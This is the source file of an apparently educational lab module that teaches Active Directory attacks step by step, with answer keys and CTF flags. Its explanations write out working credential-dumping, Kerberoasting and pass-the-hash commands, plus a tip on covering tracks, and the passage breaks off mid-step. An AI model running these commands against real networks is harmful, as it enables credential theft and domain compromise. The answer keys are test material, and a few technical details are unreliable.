'use client'
import React, { useState, useEffect } from 'react'
import Link from 'next/link'
import LabTerminal, { LabStep } from '../../../components/LabTerminal'
import FreeLabTerminal from '../../../components/FreeLabTerminal'

const accent = '#ff4136'
const moduleId = 'active-directory'
const moduleName = 'Active Directory'
const moduleNum = '05'

const steps: LabStep[] = [

  // ── PHASE 1: AD Architecture & Enumeration ────────────────────────────────

  {
    id: 'ad-01',
    title: 'Phase 1 — AD Architecture: The Core Database',
    objective: `Before attacking Active Directory you need to understand what it is. Active Directory is Microsoft's directory service — the authentication and authorisation system for most enterprise Windows networks. Every AD domain has at least one Domain Controller (DC). The DC stores all identities, group memberships, group policies, and trust relationships.

The DC runs several critical services: Kerberos (port 88), LDAP (port 389/636), DNS (port 53), SMB (port 445), and the Netlogon service. All of these are potential attack surfaces.

What is the name of the database file on a Domain Controller that stores all AD objects including user accounts, group memberships, computer accounts, and NT password hashes?`,
    hint: 'The file lives at C:/Windows/NTDS/ and has a .dit extension — it is the Active Directory database.',
    answers: ['ntds.dit', 'NTDS.dit', 'ntds', 'ntds.dit file'],
    xp: 15,
    explanation: `ntds.dit is the Active Directory database — an Extensible Storage Engine (ESE) database containing:
  - All user, computer, group, and OU objects in the domain
  - NT password hashes for every account (unsalted MD4 of the Unicode password)
  - Kerberos keys (AES128 and AES256) for every account
  - Group memberships, ACL entries, and GPO links
  - Schema definitions and domain configuration

Critical AD terminology every attacker must know:

  Domain             — administrative boundary (e.g., corp.example.com)
                       authentication and policy scope
  Forest             — collection of domains sharing a schema and global catalog
                       the top-level security boundary in AD
  Domain Controller  — Windows Server running AD DS, answering all auth requests
  Global Catalog     — partial replica of ALL objects in the forest
                       used for universal group membership lookups
  LDAP               — Lightweight Directory Access Protocol (port 389 clear, 636 TLS)
                       the query language of Active Directory
  Kerberos           — ticket-based authentication protocol (port 88)
                       replaced NTLM as the default since Windows 2000
  NTLM               — challenge-response authentication (legacy, still everywhere)
                       used when Kerberos fails: non-domain machines, IP-based auth
  SPN                — Service Principal Name — links a service to a service account
                       e.g., MSSQLSvc/sql01.corp.example.com:1433
  PAC                — Privilege Attribute Certificate — embedded in Kerberos tickets
                       contains group memberships and user SID

Why ntds.dit is the ultimate prize:
  Extracting ntds.dit gives you NT hashes for EVERY account in the domain.
  These hashes can be passed directly (Pass-the-Hash) or cracked offline.
  The krbtgt hash specifically allows creation of Golden Tickets — forged TGTs
  that grant access to any resource in the domain for up to 10 years.`
  },

  {
    id: 'ad-02',
    title: 'Phase 1 — Unauthenticated Enumeration via SMB and LDAP',
    objective: `You are on the internal network but have no credentials yet. Many Active Directory deployments allow unauthenticated or null-session enumeration via SMB or LDAP — a critical misconfiguration that leaks usernames, password policy, and domain structure to any attacker with network access.

An attacker with a username list can immediately begin password spraying or AS-REP Roasting. The password policy tells you how aggressive you can be without triggering lockouts.

What tool performs comprehensive AD enumeration via SMB and RPC including users, groups, shares, and password policy using null-session authentication? It has both an original version and a modern Go rewrite.`,
    hint: 'The tool name starts with enum4linux — there is an original Perl version and a modern rewrite called enum4linux-ng.',
    answers: ['enum4linux', 'enum4linux-ng', 'enum4linux -a target', 'enum4linux-ng -A target'],
    xp: 15,
    explanation: `enum4linux -a 192.168.1.10

Flag breakdown:
  -a      — all: runs every check in sequence (equivalent to -U -S -G -P -r -o -n -i)
  -U      — enumerate users via RPC
  -S      — enumerate shares
  -G      — enumerate groups
  -P      — password policy (minimum length, lockout threshold, complexity)
  -r      — enumerate users via RID brute force (SID + incrementing RID)
  -o      — OS information
  -n      — NetBIOS names

Modern alternative:
  enum4linux-ng -A 192.168.1.10 -oJ output.json
  Outputs structured JSON, better null session detection, faster

LDAP anonymous enumeration:
  ldapsearch -x -H ldap://192.168.1.10 -b "DC=corp,DC=example,DC=com"
  This lists ALL objects if anonymous LDAP bind is enabled.
  Many older AD environments still allow this — always try it first.

CrackMapExec (preferred for large networks):
  crackmapexec smb 192.168.1.0/24             — discover DCs, OS versions, hostnames
  crackmapexec smb 192.168.1.10 -u '' -p '' --users    — null session user list
  crackmapexec smb 192.168.1.10 --pass-pol              — password policy extraction

What the password policy tells you:
  Lockout threshold: 5 — you can try 4 passwords per user per window
  Observation window: 30 min — wait 31 minutes between spray rounds
  Password complexity: enabled — all passwords meet Windows complexity rules
  Minimum length: 8 — weak threshold, common passwords likely present

Username sources beyond enumeration:
  - LinkedIn employee names converted to corp format (firstname.lastname)
  - Email headers from phishing reconnaissance
  - Google dorking: site:corp.example.com filetype:pdf (PDFs often contain author metadata)`
  },

  {
    id: 'ad-03',
    title: 'Phase 1 — LDAP Deep Dive: Querying AD Structure',
    objective: `LDAP (Lightweight Directory Access Protocol) is the query interface for Active Directory. Every object in AD — user, computer, group, GPO, OU — is stored as an LDAP object with attributes. Understanding LDAP queries lets you enumerate AD precisely and find high-value targets.

You have a low-privilege domain account. You want to find all user accounts that have the "Do not require Kerberos pre-authentication" flag set — making them vulnerable to AS-REP Roasting — using raw LDAP before running any specialised tools.

The LDAP attribute userAccountControl is a bitmask. The bit for "DONT_REQ_PREAUTH" is 4194304 (0x400000). What ldapsearch filter would find all user accounts with this flag set?`,
    hint: 'The LDAP filter combines the objectCategory for person and a userAccountControl bitwise AND check: use the syntax (userAccountControl:1.2.840.113556.1.4.803:=4194304)',
    answers: [
      'userAccountControl:1.2.840.113556.1.4.803:=4194304',
      '(userAccountControl:1.2.840.113556.1.4.803:=4194304)',
      'ldapsearch userAccountControl 4194304',
      '(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
    ],
    flag: 'FLAG{ldap_preauth_enumerated}',
    xp: 20,
    explanation: `Full ldapsearch command to find AS-REP Roastable accounts:

  ldapsearch -x -H ldap://192.168.1.10 -D "user@corp.example.com" -w "password" \
    -b "DC=corp,DC=example,DC=com" \
    "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
    sAMAccountName userAccountControl

LDAP filter syntax breakdown:
  (&(...)(...)(...))  — AND — all conditions must be true
  (|(...)(...))       — OR — any condition true
  (!(...)  )          — NOT
  (attr=value)        — equality match
  (attr=*)            — attribute exists
  (attr>=value)       — greater than or equal

OID 1.2.840.113556.1.4.803 = LDAP_MATCHING_RULE_BIT_AND
  Checks if specific bits are set in a bitmask attribute

userAccountControl bitmask values (key ones for attackers):
  0x0002    — 2         — ACCOUNTDISABLE — account is disabled
  0x0010    — 16        — LOCKOUT — account is locked
  0x0040    — 64        — PASSWD_NOTREQD — no password required
  0x10000   — 65536     — DONT_EXPIRE_PASSWORD — password never expires
  0x400000  — 4194304   — DONT_REQ_PREAUTH — AS-REP Roastable
  0x1000000 — 16777216  — TRUSTED_FOR_DELEGATION — unconstrained delegation!

Finding unconstrained delegation computers (high-value lateral movement targets):
  ldapsearch filter: (userAccountControl:1.2.840.113556.1.4.803:=524288)
  — These machines cache TGTs of any user who authenticates to them

Other critical LDAP queries:
  All domain admins:
    (&(objectCategory=person)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=example,DC=com))

  All computers in domain:
    (objectClass=computer)

  All GPOs:
    (objectClass=groupPolicyContainer)

  Service accounts with SPNs (Kerberoastable):
    (&(objectCategory=person)(servicePrincipalName=*)(!samAccountName=krbtgt))

PowerShell LDAP queries (from a Windows foothold):
  ([adsisearcher]"(userAccountControl:1.2.840.113556.1.4.803:=4194304)").FindAll()`
  },

  // ── PHASE 2: Kerberos Protocol Internals ─────────────────────────────────

  {
    id: 'ad-04',
    title: 'Phase 2 — Kerberos Internals: TGT and the Authentication Flow',
    objective: `Kerberos is the authentication backbone of Active Directory. Understanding the protocol mechanics is essential — every major AD attack (AS-REP Roasting, Kerberoasting, Pass-the-Ticket, Golden Ticket, Silver Ticket) exploits a specific step in the Kerberos flow.

Kerberos uses three parties: the client, the Key Distribution Center (KDC — which runs on the DC), and the target service. The KDC has two components: the Authentication Server (AS) and the Ticket Granting Server (TGS).

The first step is the AS exchange. The client sends an AS-REQ to the KDC. In normal operation, this includes a pre-authentication timestamp encrypted with the user's key. The KDC validates this, then responds with an AS-REP containing two items.

What is the name of the long-lived ticket returned in the AS-REP that the client will use to request service tickets, encrypted with the krbtgt account's key?`,
    hint: 'TGT stands for Ticket Granting Ticket — it is the master credential that proves identity to the KDC for up to 10 hours.',
    answers: ['TGT', 'Ticket Granting Ticket', 'ticket granting ticket', 'tgt'],
    xp: 20,
    explanation: `Kerberos Authentication Flow — Step by Step:

STEP 1: AS-REQ (Client -> KDC Authentication Server)
  Client sends:
    - sAMAccountName (username)
    - Pre-authentication: timestamp encrypted with user's NT hash / AES key
    - Nonce (random number to prevent replay attacks)
    - Requested encryption types (AES256, AES128, RC4)

  Pre-auth prevents offline attacks: without it, anyone can request an AS-REP
  for any username and crack the encrypted portion offline — this is AS-REP Roasting.

STEP 2: AS-REP (KDC -> Client) — contains TWO encrypted blobs:
  Blob 1: Session Key, encrypted with the USER'S key (client can decrypt this)
  Blob 2: The TGT itself, encrypted with the KRBTGT account's key
    TGT contains:
      - Client identity (username + domain)
      - Session key (for TGS communication)
      - Timestamp + validity period (default: 10 hours, renewable up to 7 days)
      - PAC (Privilege Attribute Certificate) — signed by krbtgt and DC
        PAC contains: user SID, group memberships, logon time, password expiry

STEP 3: TGS-REQ (Client -> KDC Ticket Granting Server)
  Client sends:
    - The TGT (opaque to the client — it cannot read inside the TGT)
    - Authenticator: current timestamp encrypted with the Session Key
    - Requested SPN (e.g., MSSQLSvc/sql01.corp.example.com:1433)

STEP 4: TGS-REP (KDC -> Client) — the Service Ticket:
  Contains TWO blobs:
    Blob 1: New session key for client-service communication (encrypted with TGT session key)
    Blob 2: Service Ticket encrypted with the SERVICE ACCOUNT'S key
      Service ticket contains: user identity, PAC, new session key, validity

STEP 5: AP-REQ (Client -> Service)
  Client sends the Service Ticket to the target service.
  The service decrypts it with its own key, reads the PAC to determine access rights.
  NO communication with the DC at this point — the service validates entirely locally.

KEY INSIGHT: The service never contacts the DC to validate tickets.
This is why Silver Tickets work — forge a service ticket signed with the service account
hash and the service accepts it with no DC involvement whatsoever.`
  },

  {
    id: 'ad-05',
    title: 'Phase 2 — Kerberos Internals: SPNs and Service Account Registration',
    objective: `Service Principal Names (SPNs) are the mechanism that links a Kerberos service ticket request to a specific service account. When a client wants to connect to SQL Server on sql01.corp.example.com port 1433, it requests a TGS for the SPN "MSSQLSvc/sql01.corp.example.com:1433". The KDC looks up which account has this SPN registered and encrypts the service ticket with THAT account's key.

This is the exact mechanism Kerberoasting exploits: any authenticated domain user can request a TGS for any registered SPN. The ticket is encrypted with the service account's hash. If the service account has a weak password, the hash is crackable offline.

What command-line tool (part of Windows built-in setspn utility) lists all SPNs registered in the domain, revealing every service account vulnerable to Kerberoasting?`,
    hint: 'The built-in Windows tool is setspn with a -T flag for domain and -Q for query. The query "setspn -T domain -Q */*" lists all SPNs.',
    answers: ['setspn', 'setspn -T domain -Q */*', 'setspn -Q */*', 'setspn -T corp.example.com -Q */*'],
    xp: 20,
    explanation: `SPN enumeration with built-in tools:

  setspn -T corp.example.com -Q */*
  Flags:
    -T domain  — query the specified domain (use * for current domain)
    -Q */*     — query pattern: ServiceClass/Host:Port wildcard
    -L username — list SPNs for a specific account
    -A spn account — add SPN to account (requires admin — useful for abuse)
    -D spn account — delete SPN from account

Sample output:
  CN=svcSQL,CN=Users,DC=corp,DC=example,DC=com
      MSSQLSvc/sql01.corp.example.com:1433
      MSSQLSvc/sql01.corp.example.com
  CN=svcIIS,OU=Service Accounts,DC=corp,DC=example,DC=com
      HTTP/web01.corp.example.com

SPN format: ServiceClass/FQDN:Port
  Common ServiceClass values:
    MSSQLSvc  — SQL Server
    HTTP      — IIS / Web services
    WSMAN     — WinRM / PowerShell remoting
    TERMSRV   — Remote Desktop
    HOST      — generic Windows services
    ldap      — LDAP (the DC itself)
    cifs      — SMB file sharing
    GC        — Global Catalog

Why this matters for Kerberoasting:
  ANY domain user can request a TGS for ANY registered SPN.
  No special permissions required. No admin rights needed.
  The KDC will happily encrypt a ticket with the service account's key and hand it to you.
  You then crack it offline — the KDC has no way to distinguish legitimate from malicious requests.

Finding high-value SPNs to Kerberoast:
  Prioritise service accounts that are:
    1. Members of Domain Admins or high-privilege groups
    2. Have the DONT_EXPIRE_PASSWORD flag (password may be old and weak)
    3. Named obviously: svcBackup, svcAdmin, svcSQL
  Cross-reference BloodHound: find SPNs whose account has a path to DA

SPN abuse — Shadow SPNs:
  If you have GenericWrite on a user account, you can ADD a fake SPN to it.
  Then Kerberoast that account to try to crack their password.
  Remove the SPN afterward to cover tracks.`
  },

  {
    id: 'ad-06',
    title: 'Phase 2 — Kerberos Internals: The PAC and Why It Matters',
    objective: `The Privilege Attribute Certificate (PAC) is a Microsoft extension embedded inside every Kerberos ticket. It carries the user's security context: their SID, group SIDs, logon time, and account flags. The PAC is what tells services "this user is a Domain Admin" or "this user has no special rights."

The PAC contains two signatures: one made with the krbtgt key and one made with the DC's key. When a service receives a ticket, it can optionally ask the DC to validate the PAC — but most services do not do this by default.

This is the key vulnerability Golden Tickets exploit. If you know the krbtgt hash, you can forge a PAC that claims membership in ANY group, including Domain Admins, for ANY username — even one that doesn't exist.

What specific account's NT hash is required to forge a valid Golden Ticket, because it is the key that signs all TGTs in the domain?`,
    hint: 'The account that encrypts and signs all TGTs is called krbtgt — it is a special built-in service account.',
    answers: ['krbtgt', 'krbtgt hash', 'krbtgt account', 'KRBTGT'],
    flag: 'FLAG{kerberos_pac_internals}',
    xp: 25,
    explanation: `The krbtgt account — the master key of Active Directory:

  krbtgt is a built-in, disabled service account that exists in every AD domain.
  Its password is automatically managed by AD and normally never changes.
  Its NT hash and AES keys are the signing keys for ALL Kerberos tickets in the domain.

PAC structure (what's inside every Kerberos ticket):
  KERB_VALIDATION_INFO:
    LogonTime, LogoffTime, KickOffTime
    PasswordLastSet, PasswordCanChange, PasswordMustChange
    EffectiveName (sAMAccountName)
    FullName, LogonScript, ProfilePath, HomeDirectory
    LogonCount, BadPasswordCount
    UserId (RID), PrimaryGroupId
    GroupCount, GroupIds[] — THESE ARE WHAT GRANT ACCESS
    UserFlags, UserSessionKey
    LogonServer, LogonDomainName, LogonDomainId (domain SID)
    UserAccountControl

  PAC_SERVER_CHECKSUM — HMAC-MD5 or HMAC-SHA1 signed with service account key
  PAC_PRIVSVR_CHECKSUM — HMAC-MD5 or HMAC-SHA1 signed with krbtgt key

Why Golden Tickets work:
  You craft a PAC_VALIDATION_INFO with:
    - GroupIds including RID 512 (Domain Admins), 519 (Enterprise Admins)
    - UserId of 500 (Administrator) or any RID you choose
    - Any username, including one that doesn't exist
  Sign the PAC_PRIVSVR_CHECKSUM with the krbtgt key you extracted via DCSync.
  Wrap it in a valid TGT structure signed with the krbtgt key.
  The KDC sees a validly signed TGT and issues legitimate service tickets based on
  the fraudulent group memberships you embedded in the PAC.

PAC validation (the partial defense):
  Services CAN send a KERB_VERIFY_PAC_REQUEST to the DC to validate the PAC.
  Most services don't — it adds latency and most AD deployments don't require it.
  Enabling PAC validation adds a round-trip to the DC for every service authentication.

krbtgt hash rotation as incident response:
  Reset krbtgt password TWICE (two resets invalidate all existing tickets).
  Single reset not sufficient — Kerberos allows tickets to be renewed.
  Second reset ensures all tickets based on the old key are invalidated.
  This is disruptive: all currently authenticated sessions will need to re-authenticate.`
  },

  // ── PHASE 3: Credential Attacks ──────────────────────────────────────────

  {
    id: 'ad-07',
    title: 'Phase 3 — AS-REP Roasting: Exploiting Missing Pre-Authentication',
    objective: `Now that you understand the Kerberos AS exchange, you can see exactly why AS-REP Roasting works. When an account has "Do not require Kerberos pre-authentication" enabled, the KDC will answer ANY AS-REQ for that username — no password verification required at all. It responds with an AS-REP containing a blob encrypted with the user's key.

You've found from your LDAP enumeration that the account svcBackup has pre-authentication disabled. You want to request its AS-REP and extract the crackable hash without having any domain credentials at all.

What Impacket tool requests AS-REPs for accounts with pre-authentication disabled, outputting hashes in a format suitable for offline cracking?`,
    hint: 'The Impacket tool name is GetNPUsers — NP means No Pre-authentication. It is at impacket-GetNPUsers or GetNPUsers.py.',
    answers: ['GetNPUsers.py', 'impacket-GetNPUsers', 'GetNPUsers', 'getnpusers'],
    xp: 20,
    explanation: `AS-REP Roasting — full workflow:

WHY it works (protocol level):
  Normal AS-REQ: client sends encrypted timestamp (pre-auth) → KDC validates → issues TGT
  Vulnerable AS-REQ: client sends username only (no pre-auth) → KDC issues TGT anyway
  The TGT response (AS-REP) contains a session key encrypted with the user's key.
  That encrypted blob is what we crack offline.

Step 1 — Without any credentials (unauthenticated):
  impacket-GetNPUsers corp.example.com/ -usersfile userlist.txt -format hashcat -outputfile asrep_hashes.txt

  Flags explained:
    corp.example.com/     — domain with blank user (unauthenticated)
    -usersfile            — provide a list of usernames to try
    -format hashcat       — output in hashcat format (vs john)
    -outputfile           — save hashes to file for later cracking

Step 2 — With domain credentials (finds all vulnerable accounts automatically):
  impacket-GetNPUsers corp.example.com/lowprivuser:password -request -format hashcat -outputfile asrep_hashes.txt

  -request — actually request the AS-REP (not just enumerate)

Output format (Hashcat mode 18200 — Kerberos 5, etype 23, AS-REP):
  DOLLAR_krb5asrep DOLLAR 23 DOLLAR svcBackup AT CORP.EXAMPLE.COM:4b4df9...LONG_HEX_HERE

Cracking with Hashcat:
  hashcat -m 18200 asrep_hashes.txt rockyou.txt
  hashcat -m 18200 asrep_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

Cracking with John:
  impacket-GetNPUsers corp.example.com/user:pass -format john -outputfile asrep.john
  john asrep.john --wordlist=/usr/share/wordlists/rockyou.txt

Detection:
  Windows Event 4768 (TGT requested) with:
    PreAuthType = 0 (no pre-auth) — this is the red flag
  Multiple 4768 events for different usernames from the same source IP in short time

Remediation:
  Enable Kerberos pre-authentication on ALL accounts.
  The "Do not require Kerberos preauthentication" flag should only be set if an application
  explicitly requires it (legacy Kerberos implementations — very rare today).
  Set 25+ character random passwords on any account that genuinely needs this flag.`
  },

  {
    id: 'ad-08',
    title: 'Phase 3 — Kerberoasting: Offline Cracking of Service Ticket Hashes',
    objective: `You have domain credentials (a standard user account with no special permissions). Kerberoasting exploits the TGS exchange: any authenticated domain user can request a service ticket for any SPN. That ticket is encrypted with the service account's NT hash. You request it, take it offline, and crack it.

The critical insight from the protocol: the KDC has no way to distinguish a legitimate service ticket request from an attacker's request. Any domain user is authorised to request TGS tickets. This is not a misconfiguration — it is the designed behaviour of Kerberos.

What Impacket tool enumerates all accounts with SPNs and requests their TGS tickets for offline cracking?`,
    hint: 'The tool gets user SPNs — it is called GetUserSPNs. Run it as impacket-GetUserSPNs.',
    answers: ['GetUserSPNs.py', 'impacket-GetUserSPNs', 'GetUserSPNs', 'getuserspns'],
    flag: 'FLAG{kerberoast_tgs_captured}',
    xp: 20,
    explanation: `Kerberoasting — full workflow:

WHY it works (protocol level):
  Any domain user can send TGS-REQ for any SPN (this is by design).
  The KDC encrypts the service ticket with the service account's long-term key.
  You collect that encrypted blob and attempt offline dictionary / brute-force cracking.
  The DC never logs "suspicious" TGS requests — it looks like normal authentication.

Step 1 — Enumerate accounts with SPNs (no tickets yet):
  impacket-GetUserSPNs corp.example.com/user:password -dc-ip 192.168.1.10

Step 2 — Request tickets for all SPNs:
  impacket-GetUserSPNs corp.example.com/user:password -dc-ip 192.168.1.10 -request -outputfile tgs_hashes.txt

  Flags:
    -dc-ip         — Domain Controller IP
    -request       — actually request the TGS tickets (not just list SPNs)
    -outputfile    — write hashes to file
    -no-preauth    — use AS-REP roasting approach (unauthenticated)

Output format (Hashcat mode 13100 — Kerberos 5, etype 23, TGS-REP):
  DOLLAR_krb5tgs DOLLAR 23 DOLLAR * svcSQL DOLLAR CORP.EXAMPLE.COM DOLLAR ... DOLLAR LONG_HEX

Cracking:
  hashcat -m 13100 tgs_hashes.txt rockyou.txt
  hashcat -m 13100 tgs_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

AES vs RC4 tickets:
  hashcat mode 13100 — RC4/etype 23 (faster to crack, older encryption)
  hashcat mode 19700 — AES256/etype 18 (much harder — use only targeted cracking)
  Some DCs allow requesting RC4 tickets even when AES is supported:
    --downgrade-krb in some tools, or older impacket versions default to RC4

Targeting high-value accounts:
  Find service accounts that are members of Domain Admins, Server Operators,
  Backup Operators, or have AdminTo edges in BloodHound.
  A single cracked svcDBA account with DA membership = game over.

Detection and hardening:
  Event 4769 (TGS requested) with TicketEncryptionType = 0x17 (RC4)
  Many 4769 events in short time = likely Kerberoasting scan
  Mitigations:
    Use MSA/gMSA (Managed Service Accounts) — auto-rotated 240-char passwords, uncrackable
    Set 25+ character passwords on all service accounts
    Audit SPNs — remove orphaned SPNs from old accounts
    Use AES-only encryption policy — forces AES tickets, harder to crack`
  },

  // ── PHASE 4: BloodHound & Attack Path Analysis ────────────────────────────

  {
    id: 'ad-09',
    title: 'Phase 4 — SharpHound Collection: Mapping the AD Graph',
    objective: `BloodHound revolutionised Active Directory attack path analysis by modelling AD as a graph database. Users, groups, computers, GPOs, and OUs are nodes. The edges between them represent relationships: group membership, local admin rights, ACL permissions, session data, GPO application.

BloodHound answers the question: "Given that I own this low-privilege user, what is the shortest path to Domain Admin?" It finds chains of relationships that no human analyst would trace manually.

SharpHound is the data collector. On a Windows machine with a domain account, you run SharpHound to collect all this data and produce JSON files for import into BloodHound. What is the SharpHound collection flag that collects ALL data types — sessions, ACLs, GPOs, trusts, local admin — in one run?`,
    hint: 'The collection method flag is -c or --CollectionMethod and the value that collects everything is "All".',
    answers: ['All', '-c All', '--CollectionMethod All', 'CollectionMethod All', 'SharpHound -c All'],
    xp: 20,
    explanation: `SharpHound collection — full reference:

Basic collection (from domain-joined Windows machine):
  SharpHound.exe -c All
  SharpHound.exe -c All --OutputDirectory C:/Temp --ZipFileName bh_data.zip

Collection method options:
  All          — everything below (recommended for engagements)
  DCOnly       — only DC-based data (no network noise, no session collection)
  Default      — Group, LocalAdmin, Session, LoggedOn, Trusts, ACL, Container, RDP, DCOM, PSRemote
  Group        — group membership edges
  LocalAdmin   — which users/groups have local admin on which machines
  Session      — active sessions (who is logged into what RIGHT NOW)
  LoggedOn     — logged on users via registry (requires local admin on targets)
  ACL          — all ACL edges (GenericAll, GenericWrite, WriteDACL, etc.)
  GPO          — GPO links and affected OUs
  Trusts       — domain and forest trust relationships
  Container    — OU and container relationships
  RDP          — Remote Desktop permissions
  DCOM         — DCOM access permissions
  PSRemote     — PowerShell remoting permissions

Stealth flags:
  --Stealth              — only collect from DCs, no machine enumeration
  --ExcludeDomainControllers — skip DCs for session collection
  --Throttle 1000        — add 1000ms delay between requests
  --Jitter 20            — add 20% random jitter to throttle

Python collector (from Linux — no Windows machine needed):
  bloodhound-python -u user -p password -d corp.example.com -dc dc.corp.example.com -c All
  bloodhound-python -u user -p password -d corp.example.com -c DCOnly --zip

Loading into BloodHound:
  Start neo4j: sudo neo4j start (http://localhost:7474, bolt://localhost:7687)
  Start BloodHound GUI: bloodhound (connect to neo4j)
  Drag and drop ZIP file into BloodHound interface

Critical pre-built queries to run immediately:
  Find all Domain Admins
  Shortest Paths to Domain Admins
  Find Principals with DCSync Rights
  Find AS-REP Roastable Users
  Find Kerberoastable Users
  Shortest Paths from Kerberoastable Users
  Find Computers with Unsupported Operating Systems`
  },

  {
    id: 'ad-10',
    title: 'Phase 4 — Neo4j Queries and ACL Edge Analysis',
    objective: `BloodHound uses Neo4j as its graph database. Understanding the underlying Cypher query language lets you write custom queries far beyond the built-in ones. You can find attack paths that BloodHound's UI doesn't surface, mark nodes as owned, and identify every path from your current position to Domain Admin.

The most dangerous ACL edges in BloodHound are GenericAll (full control), GenericWrite (write most attributes), WriteDACL (modify permissions), WriteOwner (take ownership), ForceChangePassword (reset password), and AddMember (add users to groups).

What Cypher query finds the shortest path from ALL currently owned nodes to the Domain Admins group in Neo4j?`,
    hint: 'The query uses MATCH p=shortestPath() with the owned=true property filter on the source and targets the Domain Admins group by name.',
    answers: [
      'MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group)) WHERE g.name =~ "DOMAIN ADMINS@.*" RETURN p',
      'shortestPath owned Domain Admins',
      'MATCH p=shortestPath((n {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.EXAMPLE.COM"})) RETURN p',
      'MATCH p=allShortestPaths((u:User {owned:true})-[*1..]->(g:Group)) RETURN p'
    ],
    flag: 'FLAG{bloodhound_attack_path_found}',
    xp: 25,
    explanation: `BloodHound Cypher queries — advanced reference:

Core query structure:
  MATCH p=shortestPath((source)-[relationship*depth]->(target))
  WHERE conditions
  RETURN p

Most useful custom queries:

1. All paths from owned nodes to Domain Admins:
   MATCH p=shortestPath((n {owned:true})-[*1..]->(g:Group))
   WHERE g.name =~ "DOMAIN ADMINS@.*"
   RETURN p

2. Find all users with GenericAll on any group:
   MATCH (u:User)-[:GenericAll]->(g:Group) RETURN u.name, g.name

3. Find WriteDACL edges to high-value objects:
   MATCH (n)-[:WriteDACL]->(m) WHERE m.highvalue=true RETURN n.name, m.name

4. Computers with local admin edges from non-admin users:
   MATCH (u:User)-[:AdminTo]->(c:Computer) WHERE NOT u.admincount=true RETURN u.name, c.name

5. Kerberoastable users with path to DA:
   MATCH p=shortestPath((u:User {hasspn:true})-[*1..]->(g:Group))
   WHERE g.name =~ "DOMAIN ADMINS@.*" RETURN p

ACL edge types and what each allows:
  GenericAll       — full control: reset password, add to group, write any attribute, delete object
  GenericWrite     — write most attributes: scriptPath, servicePrincipalName, msDS-KeyCredentialLink
  WriteOwner       — become the object's owner → then grant yourself WriteDACL
  WriteDACL        — modify the object's DACL → add yourself GenericAll
  AddMember        — add members to the group
  AddSelf          — add yourself to the group (specific variation of AddMember)
  ForceChangePassword — reset password without knowing current password
  AllExtendedRights — includes ForceChangePassword and other extended rights
  ReadLAPSPassword — read the LAPS-managed local admin password from AD attribute
  GetChanges       — part of DCSync rights (DS-Replication-Get-Changes)
  GetChangesAll    — part of DCSync rights (DS-Replication-Get-Changes-All)
  DCSync requires BOTH GetChanges AND GetChangesAll on the domain object.

Marking nodes as owned in BloodHound:
  Right-click any node → Mark as Owned
  This sets node.owned = true in Neo4j
  Rerun your shortestPath queries — BloodHound will show paths from owned nodes`
  },

  // ── PHASE 5: Lateral Movement ─────────────────────────────────────────────

  {
    id: 'ad-11',
    title: 'Phase 5 — Pass-the-Hash: Moving Laterally with NTLM Hashes',
    objective: `You've extracted NT hashes from a compromised workstation. Pass-the-Hash (PtH) exploits how NTLM authentication works: instead of the password, you authenticate with the hash directly. Windows NTLM authentication involves a challenge-response where the client proves knowledge of the NT hash. You can replay this without ever knowing the plaintext password.

This is devastating in environments with local admin password reuse — one compromised workstation hash often gives access to every workstation built from the same image.

What Impacket tool gives you an interactive remote shell on a Windows target using Pass-the-Hash, similar to psexec but using SMB?`,
    hint: 'The Impacket tool is impacket-psexec and accepts hashes with the -hashes flag in the format LMHash:NTHash.',
    answers: ['impacket-psexec', 'psexec.py', 'impacket-psexec -hashes', 'psexec', 'impacket-smbexec'],
    xp: 20,
    explanation: `Pass-the-Hash — full technique breakdown:

Core command (impacket-psexec):
  impacket-psexec corp.example.com/administrator@192.168.1.50 -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

Hash format: LMHash:NTHash
  LM hash (left side): aad3b435b51404eeaad3b435b51404ee
    This is the NULL LM hash — LM authentication is disabled by default since Vista
    Always put this placeholder for modern systems
  NT hash (right side): the actual 32-character hex hash you extracted

Alternative Impacket execution tools (same hash syntax):
  impacket-smbexec  — creates a temporary service, slightly different OPSEC
  impacket-wmiexec  — uses WMI (Windows Management Instrumentation), no service created
  impacket-atexec   — uses Task Scheduler for command execution, semi-interactive
  impacket-dcomexec — uses DCOM, stealthier than psexec

CrackMapExec for PtH at scale:
  crackmapexec smb 192.168.1.0/24 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c
  Output key:
    (Pwn3d!) — hash is valid and account has local admin
    Valid credentials but not local admin — useful for further enumeration
    STATUS_LOGON_FAILURE — hash invalid on this target

Executing commands with CME PtH:
  crackmapexec smb targets.txt -u administrator -H HASH -x "whoami"
  crackmapexec smb targets.txt -u administrator -H HASH -x "net localgroup administrators"
  crackmapexec smb targets.txt -u administrator -H HASH --sam   — dump SAM database
  crackmapexec smb targets.txt -u administrator -H HASH --lsa   — dump LSA secrets
  crackmapexec smb targets.txt -u administrator -H HASH -M mimikatz — run Mimikatz module

pth-winexe (alternative Linux tool):
  pth-winexe -U corp/administrator%aad3b435b51404eeaad3b435b51404ee:HASH //192.168.1.50 cmd.exe

LAPS check — before assuming hash reuse:
  crackmapexec smb targets.txt -u user -p pass -M laps
  LAPS stores per-machine passwords in ms-Mcs-AdmPwd AD attribute
  LAPS = no hash reuse, each machine has unique local admin password
  But you can still use PtH for domain accounts whose hashes you extracted

Detection:
  Event 4624 (logon) with LogonType 3 (network) and LmPackageName = NTLM
  Account name mismatches (admin logging in at unusual time from unusual source)
  Microsoft Defender for Identity: lateral movement path detection`
  },

  {
    id: 'ad-12',
    title: 'Phase 5 — Pass-the-Ticket and Over-Pass-the-Hash',
    objective: `Pass-the-Ticket (PtT) is the Kerberos equivalent of Pass-the-Hash. Instead of using an NT hash with NTLM, you steal or forge a Kerberos ticket from memory and inject it into your current session. Windows stores Kerberos tickets in LSASS memory and you can extract them with Mimikatz.

Over-Pass-the-Hash (also called Pass-the-Key) is a hybrid: you have an NT hash or AES key but want a Kerberos ticket. You use the hash to request a legitimate TGT from the DC, then use Kerberos for all subsequent authentication. This is stealthier than NTLM-based PtH because the resulting traffic is Kerberos, not NTLM.

